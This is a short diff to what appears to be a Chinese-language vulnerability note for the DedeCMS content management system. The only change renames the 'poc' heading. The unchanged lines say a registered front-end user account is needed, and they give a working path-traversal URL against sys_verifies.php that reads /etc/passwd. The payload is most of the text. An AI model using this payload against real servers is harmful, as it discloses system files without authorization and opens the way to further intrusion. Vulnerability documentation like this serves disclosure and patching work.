@@ -2,7 +2,7 @@
 
 需前台注册用户权限。
 
-## poc
+## POC
 
 ```java
 http://ip/dede/sys_verifies.php?action=view&filename=../../../../../etc/passwd
